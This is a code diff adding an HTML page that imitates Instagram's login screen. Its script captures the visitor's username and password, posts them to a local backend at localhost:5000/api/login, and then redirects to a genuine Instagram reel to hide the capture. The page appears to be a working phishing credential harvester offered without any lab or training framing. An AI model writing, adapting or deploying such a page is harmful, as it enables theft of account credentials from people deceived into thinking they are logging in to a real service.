@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <div class="center">
+        <div class="header">
+          <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
+        </div>
+        <div class="inputElement">
+          <input
+            type="text"
+            id="username"
+            placeholder="Phone number, username or email"
+            class="inputText"
+            required
+          />
+          <input
+            type="password"
+            id="password"
+            placeholder="Password"
+            class="inputText"
+            required
+          />
+          <input
+            type="submit"
+            value="Log in"
+            class="inputButton"
+            id="loginButton"
+          />
+          <div class="line">
+            <span class="arrow"></span>
+            <span class="content">OR</span>
+            <span class="arrow"></span>
+          </div>
+          <div class="social__icon">
+            <i class="fab fa-facebook-square"></i
+            ><span>Log in with facebook</span>
+          </div>
+          <div class="forgetPassword">Forget Password?</div>
+        </div>
+      </div>
+      <div class="footer">
+        <p>Don't have an account?<span>Sign Up</span></p>
+      </div>
+    </div>
+
+    <script>
+      // Get references to the input fields and button
+      const loginButton = document.getElementById("loginButton");
+      const usernameField = document.getElementById("username");
+      const passwordField = document.getElementById("password");
+    
+      // Add event listener for the login button
+      loginButton.addEventListener("click", async (e) => {
+        e.preventDefault(); // Prevent default form submission
+    
+        // Get the input values
+        const username = usernameField.value.trim();
+        const password = passwordField.value.trim();
+    
+        // Validate inputs
+        if (!username || !password) {
+          alert("Please enter both username and password.");
+          return;
+        }
+    
+        // Send data to the backend
+        try {
+          const response = await fetch("http://localhost:5000/api/login", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ username, password }),
+          });
+    
+          const data = await response.json();
+    
+          if (response.ok) {
+            // alert("Login successful!");
+            
+            // Redirect to another page (replace with your desired URL)
+            window.location.href = "https://www.instagram.com/reels/DErTijcTIjW/"; // Example page after login
+          } else {
+            alert(`Login failed: ${data.message}`);
+          }
+        } catch (error) {
+          console.error("Error:", error);
+          alert("An error occurred while trying to log in.");
+        }
+      });
+    </script>
+  </body>
+</html>
